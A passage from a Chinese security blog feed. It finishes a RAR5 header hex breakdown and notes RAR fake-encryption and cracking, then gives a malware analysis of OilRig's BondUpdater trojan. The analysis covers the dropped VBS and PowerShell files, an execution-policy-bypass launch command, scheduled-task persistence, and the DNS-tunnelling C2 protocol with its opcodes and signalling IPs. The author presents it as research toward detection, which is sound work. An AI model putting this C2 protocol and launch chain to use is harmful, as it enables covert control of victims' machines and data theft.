class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">00336299 - 00336482  </span><br><span class="line">C3 CA 91 FD - Header CRC32( Header size -&gt; Name )</span><br><span class="line">0E - Header size( Header size -&gt; Name ) 0EH = 14D</span><br><span class="line">03 - Header <span class="built_in">type</span>( 服务头 ) </span><br><span class="line">06 - Header flags( 0x06 = 0x02 + 0x04 )</span><br><span class="line">A5 01 - Data area size</span><br><span class="line">00 - File flags</span><br><span class="line">A5 01 - Unpacked size</span><br><span class="line">00 - Attributes</span><br><span class="line">80 00 - Compression information</span><br><span class="line">00 - Host OS</span><br><span class="line">02 - Name length( 02H = 2D )</span><br><span class="line">51 4F - Name( QO - 快速打开头 )   </span><br><span class="line">16 E8 D1 20 - Structure CRC32( Structure size -&gt; Data ) Data area(快速打开记录数据)</span><br><span class="line">9F 01 - Structure size( Structure size -&gt; Data )</span><br><span class="line">00 - Flags</span><br><span class="line">E9 C6 01 - Offset</span><br><span class="line">99 01 - Data size</span><br><span class="line">FF A6 73 44 - Header CRC32( Header size -&gt; Extra area ) Data</span><br><span class="line">93 01 - Header size( Header <span class="built_in">type</span> -&gt; Extra area )</span><br><span class="line">02 - Header <span class="built_in">type</span>( 文件头 )</span><br><span class="line">03 - Header flags( 0x03 = 0x01 + 0x02 )</span><br><span class="line">6F - Extra area size[ 0x6F = (0x30+0x01) + (0x22+0x01) + (0x1A+0x01) ]</span><br><span class="line">D0 C5 01 - Data area size</span><br><span class="line">00 - File flags                       ‭  </span><br><span class="line">B3 E9 - Unpacked size </span><br><span class="line">01 20 - Attributes    </span><br><span class="line">80 03 - Compression information</span><br><span class="line">00 - Host OS</span><br><span class="line">15 - Name length( 15H = 21D )</span><br><span class="line">32 30 32 30 30 32 30 35 31 31 34 36 31 34 39 34 35 2E 70 6E 67 - Name</span><br><span class="line">30 - Size( Extra area ) 30H = 48D</span><br><span class="line">01 - Type( 文件加密记录 )</span><br><span class="line">00 - Version</span><br><span class="line">03 - Flags( 0x03 = 0x02 + 0x01 )</span><br><span class="line">0F - KDF count</span><br><span class="line">48 2F 76 C7 97 E7 8A 77 D5 55 F8 1F 5F 31 D8 26 - Salt</span><br><span class="line">5C 4C 4F B0 4F 94 01 90 95 95 2E E9 E6 BF 8F 75 - IV</span><br><span class="line">4D 87 A2 57 6C EA BA B2 EB D6 4E A8 - Check value</span><br><span class="line">22 - Size( Extra area ) 22H = 34D</span><br><span class="line">02 - Type( 文件哈希记录 )</span><br><span class="line">00 - Hash <span class="built_in">type</span></span><br><span class="line">16 87 E7 C4 D1 8C 13 AA BD B5 18 4A A9 C7 3E D1 85 85 95 B4 6F 12 3E 55 10 C6 86 7C 5A 2E 80 B9 - Hash data</span><br><span class="line">1A - Size( Extra area ) 1AH = 26D</span><br><span class="line">03 - Type( 文件时间记录 )</span><br><span class="line">0E - Flags( 0x0E = 0x02 + 0x04 + 0x08 )</span><br><span class="line">8C E5 A3 8C 2A 01 D6 01 - mtime</span><br><span class="line">7D A3 8E 8E 2A 01 D6 01 - ctime</span><br><span class="line">87 27 7A 12 2D 2D D6 01 - atime </span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Note: vint类型的数据，如果是多字节的，前几个字节的最高位为连续标志</span><br><span class="line">(设为1)，低7位为数据，最后一个字节的最高位为0，低7位依旧是数据。所</span><br><span class="line">以我们需要提取出数据，进行重新组合，才能得到“Quick open header”</span><br><span class="line">和“Recovery record”真实偏移。</span><br><span class="line">1、Data area size &amp;&amp; Unpacked size</span><br><span class="line">0x01A5( 00000001 10100101 )</span><br><span class="line">0000001 0100101B = 10100101B = A5H = 165D</span><br><span class="line">2、Compression information</span><br><span class="line">0x0080( 00000000 10000000 )</span><br><span class="line">0000000 0000000B = 0000 000 0 000000B</span><br><span class="line">( 0000 - 字典大小128KB、000 - 存储、0 - solid flag、000000 - 压缩算法版本 )</span><br><span class="line">3、Structure size</span><br><span class="line">0x019F( 00000001 10011111 )</span><br><span class="line">0000001 0011111B = 10011111B = 9FH = 159D</span><br><span class="line">4、Offset</span><br><span class="line">0x01C6E9( 00000001 11000110 11101001 )</span><br><span class="line">0000001 1000110 1101001B = 01100011 01101001B = 6369H = ‭25449‬D</span><br><span class="line">336299 - 25449 = 310850(文件头起始偏移)</span><br><span class="line">5、Data size</span><br><span class="line">0x0199( 00000001 10011001 )</span><br><span class="line">0000001 0011001B = 10011001B = 99H = 153D</span><br><span class="line">----------------------------------------------------------------------</span><br></pre></td></tr></table></figure><hr><h2 id="3、针对RAR的主要攻击方式"><a href="#3、针对RAR的主要攻击方式" class="headerlink" title="3、针对RAR的主要攻击方式"></a>3、针对RAR的主要攻击方式</h2><h3 id="3-1、爆破"><a href="#3-1、爆破" class="headerlink" title="3.1、爆破"></a>3.1、爆破</h3><p>RAR 5.0 密码破解<br><a href="https://blog.xugr.me/post/rar-crack/" target="_blank" rel="noopener">https://blog.xugr.me/post/rar-crack/</a></p><h3 id="3-2、伪加密"><a href="#3-2、伪加密" class="headerlink" title="3.2、伪加密"></a>3.2、伪加密</h3><p>&emsp;&emsp;<code>伪加密</code>只发生在<code>RAR5.0以前的版本</code>中，我们只需要修改<code>FILE_HEAD</code>中的<code>HEAD_FLAGS</code>的<code>0x0004</code>标记为1，就可以造成<code>RAR伪加密</code>。</p>]]></content>
      
      <categories>
          
          <category> FileFormat </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析</title>
      <link href="/2019/04/11/OilRig%E6%96%B0%E5%9E%8BBondUpdater%E6%9C%A8%E9%A9%AC%E7%9A%84DNS%E9%9A%90%E8%94%BD%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/"/>
      <url>/2019/04/11/OilRig%E6%96%B0%E5%9E%8BBondUpdater%E6%9C%A8%E9%A9%AC%E7%9A%84DNS%E9%9A%90%E8%94%BD%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>一款使用DNS隐蔽信道通信的木马分析。<br>这是之前在公司实习的时候写的木马分析文章。<br><a id="more"></a></p></blockquote><h2 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h2><p>&emsp;&emsp;<code>OilRig</code>是伊朗的<code>APT组织</code>，<code>unit42</code>发现<code>2016年</code>中期以来，此组织一直很活跃，其经常对<code>中东地区</code>的<code>政府机构</code>和<code>企业</code>发动攻击。<code>2018年</code>8月，<code>Unit42</code>发现OilRig针对中东政府组织使用<code>鱼叉式钓鱼邮件</code>投递一个更新版本的<code>BondUpdater</code>。BondUpdater是<code>FireEye</code>于<code>2017年</code>11月中旬首次发现的基于<code>PowerShell</code>的特洛伊木马。</p><p>&emsp;&emsp;BondUpdater木马包含基本的后门功能，允许攻击者<code>上传</code>和<code>下载</code>文件，以及<code>执行命令</code>。与OilRig组织的其它工具一样，BondUpdater使用<code>DNS隧道</code>与<code>C2服务器</code>进行通信。<code>更新版本</code>的BondUpdater木马能够在DNS隧道中使用<code>TXT记录</code>与<code>C2</code>进行通信，<code>老版本</code>的是使用<code>A记录</code>与<code>C2</code>进行通信。</p><p>&emsp;&emsp;近期，我在研究利用<code>DNS隐蔽信道通信</code>的技术，所以找到了这样一个样本来进行分析，想了解一下，使用这种技术通信的恶意软件实现通信的细节，以便我可以研究怎么去检测这种攻击。</p><h2 id="2、样本分析"><a href="#2、样本分析" class="headerlink" title="2、样本分析"></a>2、样本分析</h2><h3 id="2-1、提取关键文件及代码"><a href="#2-1、提取关键文件及代码" class="headerlink" title="2.1、提取关键文件及代码"></a>2.1、提取关键文件及代码</h3><p><strong><code>MD5:</code></strong>52b6e1ef0d079f4c2572705156365c06</p><p>此样本是一个<code>word文档</code>，用Microsoft Word打开一下看看。</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/1.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;可以看到样本中嵌入了<code>宏代码</code>，但是利用word自带的<code>宏编辑器</code>是看不到宏代码的，我们可以通过<code>oledump</code>或者<code>oletools</code>来提取宏代码。我这里使用<code>oledump</code>来提取宏代码。</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/2.png" width="70%" height="70%" alt=""></div><p>可以看到<code>宏代码</code>存在于<code>第7段</code>，我们将其转存为<code>ThisDocument.vb</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oledump.py -s 7 -v 7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00_doc &gt; ThisDocument.vb</span><br></pre></td></tr></table></figure></p><p><code>ThisDocument.vb</code>内容如下：</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/3.png" width="70%" height="70%" alt=""></div><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/4.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;当运行宏之后，会首先执行<code>Document_Open()</code>函数，此函数调用了<code>AAAA()</code>函数，在AAAA()函数中，又调用了<code>HGHG()</code>函数，分别创建了两个文件，<code>AppPool.vbs</code>和<code>AppPool.ps1</code>,并将宏代码中嵌入的<code>vbs代码</code>和<code>powershell代码</code>写入这两个文件。之后通过执行<code>wscript C:\ProgramData\WindowsAppPool\AppPool.vbs</code>运行AppPool.vbs。</p><p>&emsp;&emsp;我们在虚拟机中跑一下，将这两个文件提取出来。</p><p><strong><code>AppPool.vbs</code></strong>内容如下：</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/5.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;当<code>AppPool.vbs</code>首次执行时，其创建一个每分钟执行的<code>计划任务</code>，使木马文件能够被<code>不断执行</code>。然后通过<code>PowerShell.exe -exec bypass -file C:\ProgramData\WindowsAppPool\AppPool.ps1</code>运行AppPool.ps1。</p><p>&emsp;&emsp;<code>AppPool.vbs</code>后续的执行过程中会判断是否存在<code>&quot;quid&quot;</code>的文件，如果存在，就使用上述<code>powershell</code>脚本运行<code>AppPool.ps1</code>。AppPool.ps1<code>首次运行</code>时会创建<code>quid文件</code>，以避免创建<code>多个计划任务</code>。</p><p><strong><code>AppPool.ps1</code></strong>内容如下：</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/6.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;原始的<code>AppPool.ps1</code>是经过<code>混淆</code>的，这是经过初步处理的，不过还不是很好懂。主要的操作都是由此<code>powershell</code>代码实现的，通过<code>DNS隐蔽信道</code>与<code>C2</code>进行通信的代码也在其中。</p><h3 id="2-2、分析关键代码"><a href="#2-2、分析关键代码" class="headerlink" title="2.2、分析关键代码"></a>2.2、分析关键代码</h3><blockquote><p><strong><code>AppPool.ps1</code></strong>代码大致流程：<br>1、在目录<code>&quot;C:\ProgramData\WindowsAppPool&quot;</code>创建<code>lock</code>、<code>qiud</code>两个文件。<br>2、以<code>quid中的内容</code>为<code>文件夹名称</code>在目录”C:\ProgramData\WindowsAppPool”创建文件夹，还创建了<code>“files”</code>文件夹。再在<code>第一个文件夹</code>中创建三个目录，<code>“sendbox”</code>、<code>“receivebox”</code>、<code>“done”</code>。<br>3、构造<code>域名</code>，发起包含<code>初始信标</code>的DNS请求，通知C2<code>开始通信</code>。<br>4、创建任务，<code>定期</code>与C2通信。从C2<code>接收命令</code>，将命令<code>写入到文件</code>，并保存在<code>“receivebox”</code>文件夹中。<br>5、对接收到的命令<code>进行解析</code>，<code>执行命令</code>，然后将<code>结果写入文件</code>，保存在<code>“sendbox”</code>文件夹下，以待后续发往C2.<br>6、将<code>命令执行结果</code>传回C2服务器。</p></blockquote><h4 id="2-2-1、创建lock、quid两个文件"><a href="#2-2-1、创建lock、quid两个文件" class="headerlink" title="2.2.1、创建lock、quid两个文件"></a>2.2.1、创建<code>lock</code>、<code>quid</code>两个文件</h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/7.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;<code>lock文件</code>写入的是当前<code>powershell进程</code>的<code>PID号</code>，powershell脚本会检测<code>当前时间</code>和<code>进程启动时间</code>之差是否<code>超过10分钟</code>，如果超过10分钟就会<code>终止进程</code>并删除<code>lock文件</code>。</p><p>&emsp;&emsp;<code>quid的内容</code>是由<code>GUID</code>(全局唯一标识符)的<code>前八个字符</code>和一个<code>两位的随机整数</code>组成。</p><h4 id="2-2-2、创建files、sendbox、receivebox、done文件夹"><a href="#2-2-2、创建files、sendbox、receivebox、done文件夹" class="headerlink" title="2.2.2、创建files、sendbox、receivebox、done文件夹"></a>2.2.2、创建<code>files</code>、<code>sendbox</code>、<code>receivebox</code>、<code>done</code>文件夹</h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/8.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;<code>files文件夹</code>的作用未从代码中分析出来。<code>sendbox</code>用于存储<code>将要发送到C2的文件</code>，<code>receivebox</code>用于存储从C2接收到的<code>命令文件</code>，<code>done</code>也是用于存储<code>从C2接收到的文件</code>，以便将来使用。</p><h4 id="2-2-3、受害者发送初始信标，开始与C2通信"><a href="#2-2-3、受害者发送初始信标，开始与C2通信" class="headerlink" title="2.2.3、受害者发送初始信标，开始与C2通信"></a>2.2.3、<code>受害者</code>发送<code>初始信标</code>，开始与C2通信</h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/9.png" width="70%" height="70%" alt=""></div><p>参数中的<code>“M”</code>就是<code>操作的类型</code>，是<code>初始信标</code>，表示开始通信，<code>“r”</code>表示按<code>接收数据的格式</code>生成域名。</p><h4 id="2-2-4、定期通信，从C2接收数据。"><a href="#2-2-4、定期通信，从C2接收数据。" class="headerlink" title="2.2.4、定期通信，从C2接收数据。"></a>2.2.4、<code>定期</code>通信，从C2<code>接收数据</code>。</h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/10.png" width="70%" height="70%" alt=""></div><p>每隔<code>50毫秒</code>尝试与C2进行<code>通信一次</code>。</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/11.png" width="70%" height="70%" alt=""></div><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/19.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;<code>dns_request_TXT()</code>功能为构造<code>DNS请求数据包</code>，发起<code>DNS请求</code>，返回<code>响应包数据</code>。这里的dns_request()函数有<strong><code>两种</code></strong>，分别是发送DNS <code>A记录请求</code>和<code>TXT记录请求</code>，下面在分析通信协议的时候会提到。如果木马发送的是<code>DNS A记录请求</code>，木马会从<code>A记录响应包</code>中的<code>address段(ip)</code>提取数据。如果木马发送的是<code>DNS TXT记录请求</code>，木马会从<code>DNS TXT记录响应包</code>中的<code>TXT段(存储数据)</code>提取数据。</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/12.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;<code>C2</code>传输数据到<code>木马</code>总共有<strong><code>两种传输方式</code></strong>，<strong><code>一</code></strong>是通过<code>域名响应ip</code>进行传输，这种是通过发送<code>A记录请求</code>。<strong><code>另一种</code></strong>是通过<code>TXT记录</code>进行传输。上面图片中的代码是对<code>DNS TXT记录响应包</code>进行处理的过程。木马会将接收到的<code>TXT数据</code>以<code>“&gt;”</code>分开，<strong><code>左边</code></strong>的作为<code>指令</code>，<strong><code>右边</code></strong>的作为<code>数据</code>。左边的指令决定木马将会如何处理右边的数据。具体的处理规则会在下一节进行描述。从<code>响应包</code>中解析出的<code>指令</code>和<code>数据</code>，会以<code>文件的形式</code>存储在<code>receivebox文件夹</code>下。以待后续处理。</p><h4 id="2-2-5、解析接收到的文件，执行命令"><a href="#2-2-5、解析接收到的文件，执行命令" class="headerlink" title="2.2.5、解析接收到的文件，执行命令"></a>2.2.5、<code>解析</code>接收到的文件，<code>执行命令</code></h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/13.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;无论是通过<code>A记录</code>进行接收的数据还是通过<code>TXT记录</code>接收的数据，都以<code>文件的形式</code>保存在<code>receivebox文件夹</code>下，文件名以<code>“rcvd”</code>开头。而且会使用相同的<code>文件处理程序</code>。文件处理程序根据<code>文件名</code>的<code>最后一个字符</code>，决定怎么处理以<code>此文件名</code>为名字的<code>文件的内容</code>。</p><h4 id="2-2-6、将执行结果发送回C2服务器"><a href="#2-2-6、将执行结果发送回C2服务器" class="headerlink" title="2.2.6、将执行结果发送回C2服务器"></a>2.2.6、将<code>执行结果</code>发送回<code>C2服务器</code></h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/14.png" width="70%" height="70%" alt=""></div><p><code>&quot;s&quot;</code>是以<code>发送数据的格式</code>生成域名，文件的<code>名称</code>和<code>内容</code>是通过<code>域名</code>来进行传送的。<strong><code>$SSE</code></strong>代表数据块，<strong><code>$TTE</code></strong>代表文件名。下节中的数据格式的介绍中会具体提到这些参数。</p><h3 id="2-3、通信协议分析"><a href="#2-3、通信协议分析" class="headerlink" title="2.3、通信协议分析"></a>2.3、通信协议分析</h3><h4 id="2-3-1、数据格式"><a href="#2-3-1、数据格式" class="headerlink" title="2.3.1、数据格式"></a>2.3.1、数据格式</h4><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/15.png" width="70%" height="70%" alt=""></div><p><strong><code>发送数据格式：</code></strong><br>&lt;包含分片号、操作类型、GUID前8字符、随机二位整数的字符串&gt;&lt;序号&gt;<1~7个随机字符>C&lt;分片号偏移&gt;&lt;操作类型偏移&gt;T.&lt;数据块&gt;.&lt;文件名&gt;.&#60;C2域名&#62;</1~7个随机字符></p><p><strong><code>接收数据格式：</code></strong><br>&lt;包含分片号、操作类型、GUID前8字符、随机二位整数的字符串&gt;&lt;序号&gt;<1~7个随机字符>C&lt;分片号偏移&gt;&lt;操作类型偏移&gt;T.&#60;C2域名&#62; </1~7个随机字符></p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/16.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;<code>分片号偏移</code>和<code>操作类型偏移</code>都是相对<code>GUID前8字符和随机2位整数</code>组成的字符串的。<strong><code>接收数据格式</code></strong>的<strong><code>第一部分</code></strong>包含<code>分片号</code>、<code>操作类型</code>、<code>GUID前8字符</code>、<code>随机二位整数</code>的字符串，木马首先生成<code>GUID号</code>，然后取<code>GUID号的前8位</code>与一个<code>2位随机整数</code>相连接形成<code>基础字符串</code>，最后将<code>分片号</code>和<code>操作类型</code>随机<code>插入基础字符串</code>。<strong><code>第二部分</code></strong>是1~7位的随机字符串。<strong><code>第三部分</code></strong>就是<code>C</code>和<code>T</code>以及<code>中间的两个数字</code>，<code>第一个数字</code>为<code>操作类型</code>在<code>基础字符串中的偏移</code>，<code>第二个数字</code>为<code>分片号</code>在<code>基础字符串中的偏移</code>。<strong><code>第四部分</code></strong>就是C2域名。<strong><code>发送数据格式</code></strong>和<strong><code>接收数据格式</code></strong>的区别就是多了<code>数据块</code>和<code>文件名</code>。</p><h4 id="2-3-2、DNS请求中包含的操作类型"><a href="#2-3-2、DNS请求中包含的操作类型" class="headerlink" title="2.3.2、DNS请求中包含的操作类型"></a>2.3.2、DNS请求中包含的操作类型</h4><table><thead><tr><th style="text-align:center">操作类型</th><th style="text-align:center">A/TXT</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:center">M</td><td style="text-align:center">A/TXT</td><td style="text-align:left">初始信标</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">A</td><td style="text-align:left">提示C2发送文件名</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">A</td><td style="text-align:left">提示C2发送数据</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">A</td><td style="text-align:left">表明木马正在发送数据，可能是命令执行结果，也可能是受害者机器中的文件</td></tr><tr><td style="text-align:center">W</td><td style="text-align:center">TXT</td><td style="text-align:left">提示C2发送文件名</td></tr><tr><td style="text-align:center">D</td><td style="text-align:center">TXT</td><td style="text-align:left">提示C2发送数据</td></tr><tr><td style="text-align:center">P</td><td style="text-align:center">TXT</td><td style="text-align:left">TXT记录方法失败，通知C2切换到A记录方法</td></tr></tbody></table><p>&emsp;&emsp;将此<code>操作类型</code>包含在生成的<code>子域名</code>中，可以通知C2在<code>响应数据包</code>中使用<code>哪种数据格式</code>。例如：如果操作类型是<strong><code>“W”</code></strong>，C2会发送响应包的<code>TXT段</code>以<code>“S000s”</code>为开头的数据，<code>发送的数据</code>会作为<code>文件名</code>。如果操作类型是<strong><code>“0”</code></strong>，C2会将<code>域名响应ip</code>置为<code>“24.125.[\d].[\d]”</code>,使木马将<code>ip地址的后两段</code>作为<code>文件名</code>进行接收。powershell代码中写了<strong><code>两种记录的DNS请求</code></strong>方法。如下所示：<br><strong><code>A记录请求</code></strong>：</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/17.png" width="70%" height="70%" alt=""></div><p><strong><code>TXT记录请求</code></strong>：</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/18.png" width="70%" height="70%" alt=""></div><h4 id="2-3-3、文件名末尾字符含义"><a href="#2-3-3、文件名末尾字符含义" class="headerlink" title="2.3.3、文件名末尾字符含义"></a>2.3.3、文件名末尾字符含义</h4><table><thead><tr><th style="text-align:center">末尾字符</th><th style="text-align:center">目的</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">执行命令</td><td style="text-align:left">读取文件内容，并当做cmd命令执行。命令的输出保存到以“proc”开头的文件中，并存在“sendbox”文件夹中，等待发送给C2</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">下载文件</td><td style="text-align:left">C2从受害者机器下载文件，木马读取文件内容以获取文件下载路径，将指定的文件复制到“sendbox”文件夹下，以便木马发送到C2</td></tr><tr><td style="text-align:center">其他</td><td style="text-align:center">上传文件</td><td style="text-align:left">C2向受害者机器上传文件，上传的文件将存储在“done”文件夹下，以供将来使用。木马将“200 &lt;&gt; [文件上传路径]”写入“sendbox”文件夹下的文件，以便木马通知C2文件上传成功</td></tr></tbody></table><p>&emsp;&emsp;因为木马从C2<code>接收的数据</code>都是以<code>文件的形式</code>存储在<code>“receivebox”文件夹</code>下的，所以当木马从C2接收完<code>所有的数据</code>后，会执行<code>文件处理程序</code>。文件处理程序会根据<code>以上协议</code>对<code>接收到的数据</code>进行处理。</p><h4 id="2-3-4、原始数据传输过程中的域名解析IP地址及其含义"><a href="#2-3-4、原始数据传输过程中的域名解析IP地址及其含义" class="headerlink" title="2.3.4、原始数据传输过程中的域名解析IP地址及其含义"></a>2.3.4、原始数据传输过程中的域名解析IP地址及其含义</h4><table><thead><tr><th style="text-align:center">IP地址</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:center">24.125.[\d].[\d]</td><td style="text-align:left">在“receivebox”创建文件名为“rcvd [\d][\d]”的文件,以存储将要处理的数据</td></tr><tr><td style="text-align:center">[\d].[\d].[\d].[\d]</td><td style="text-align:left">前三个[\d]作为数据，第四个[\d]指向数据数组最后一个元素的后一个位置</td></tr><tr><td style="text-align:center">1.2.3.[\d]</td><td style="text-align:left">命令木马将数据写入文件，并开始处理数据</td></tr><tr><td style="text-align:center">11.24.237.110</td><td style="text-align:left">杀死木马进程</td></tr></tbody></table><p>&emsp;&emsp;<code>原始数据传输</code>就是通过<strong><code>A记录</code></strong>传输的，数据是放在<code>DNS响应包</code>的<code>address段的ip地址</code>中的。木马发送包含<strong><code>“0”操作类型</code></strong>的DNS请求，C2就会将<code>响应ip地址</code>设为形如<code>“24.125.[\d].[\d]”</code>的地址，并将<code>文件名</code>填充在里面。木马<code>接收到数据</code>会将其与<code>“rcvd”</code>连接在一起，作为<code>文件名</code>，并修改<code>操作类型为“1”</code>。然后木马开始发送包含<strong><code>“1”操作类型</code></strong>的DNS请求，C2就会将<code>响应ip</code>设为形如<code>“[\d].[\d].[\d].[\d]”</code>的地址，并将<code>数据</code>填充在里面。如果数据<code>发送完了</code>，C2就会将<code>响应ip地址</code>设为形如<code>“1.2.3.[\d]”</code>形式的地址。木马接收到后就会将<code>数据</code>存在以前面<code>接收到的文件名</code>为名的文件中，并保存在<code>“reveiveboc”文件夹</code>下。</p><h4 id="2-3-5、其他域名解析IP地址含义"><a href="#2-3-5、其他域名解析IP地址含义" class="headerlink" title="2.3.5、其他域名解析IP地址含义"></a>2.3.5、其他域名解析IP地址含义</h4><table><thead><tr><th style="text-align:center">IP地址</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:center">99.250.250.199</td><td style="text-align:left">响应初始信标，通过新型数据传输协议进行传输数据</td></tr><tr><td style="text-align:center">[quid.substring.(0,2)].2.3.[\d]</td><td style="text-align:left">从响应的ip地址中提取数据</td></tr><tr><td style="text-align:center">253.25.42.87</td><td style="text-align:left">杀死木马进程，删除命令执行结果文件</td></tr></tbody></table><p>&emsp;&emsp;这些<code>IP地址</code>是整个通信过程中除去<code>原始数据</code>传输过程中的<code>域名解析IP地址</code>以外的IP地址。<code>“99.250.250.199”</code>用于表示木马想要与C2<code>开始通信</code>。因为有些数据比较长，所以会<code>分片</code>进行传输，<code>“[quid.substring.(0,2)].2.3.[\d]”</code>的最后一段表示目前传输的分片号，用于判断数据是否完整传输完成。</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/20.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;当<code>文件的字节数</code>大于<code>60字节</code>，就需要<code>多次传输</code>，木马作者设置了<code>数据传输长度</code>的阈值为60。</p><h4 id="2-3-6、新数据传输协议指令含义"><a href="#2-3-6、新数据传输协议指令含义" class="headerlink" title="2.3.6、新数据传输协议指令含义"></a>2.3.6、新数据传输协议指令含义</h4><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:center">N</td><td style="text-align:left">将下一次DNS请求中的操作类型置为“W”</td></tr><tr><td style="text-align:center">S000s</td><td style="text-align:left">在“receivebox”下，将接收到的数据与“rcvd”连接，作为将要存储接收数据的文件的文件名，并将下一次DNS请求中的操作类型置为“D”</td></tr><tr><td style="text-align:center">S</td><td style="text-align:left">将下一查询操作类型置为“D”,并将从响应包接收到的数据进行base64解码</td></tr><tr><td style="text-align:center">E</td><td style="text-align:left">将执行“S”指令后得到的结果写入执行“S000s”指令后生成的文件中</td></tr><tr><td style="text-align:center">C</td><td style="text-align:left">退出循环，取消通信</td></tr></tbody></table><p>&emsp;&emsp;<code>新数据传输协议</code>就是通过<strong><code>TXT记录</code></strong>进行传输数据。当木马发送<strong><code>操作类型为“W”</code></strong>的TXT记录DNS请求，C2就会回复一个<code>包含TXT数据</code>的响应包，<code>响应包</code>中的<code>TXT字段</code>存储了C2发给木马的<code>数据</code>，数据以<code>“&gt;”</code>号分隔开来。如果<code>“&gt;”左边</code>的字符串为<code>“S000s”</code>，木马就将<code>“&gt;”右边</code>的数据与<code>“rcvd”</code>连接，作为将要<code>存储数据</code>的文件的<code>文件名</code>，然后将操作类型置为“D”。然后发送包含<strong><code>操作类型“D”</code></strong>的TXT记录请求，C2会回复TXT数据中<code>“&gt;”左边</code>为<code>“S”</code>的响应包，木马会将<code>“&gt;”右边</code>的数据进行<code>base64解码</code>，并将下一次请求的操作类型置为“D”,再发送包含<strong><code>操作类型“D”</code></strong>的TXT记录请求，直到数据<code>发送完成</code>，然后C2会回复TXT数据中<code>“&gt;”左边</code>为<code>“E”</code>的响应包，木马会将<code>base64解码后的数据</code>写入执行<code>“S000s”指令</code>后生成的<code>文件名</code>的文件中，然后跳出循环。</p><h2 id="3、总结"><a href="#3、总结" class="headerlink" 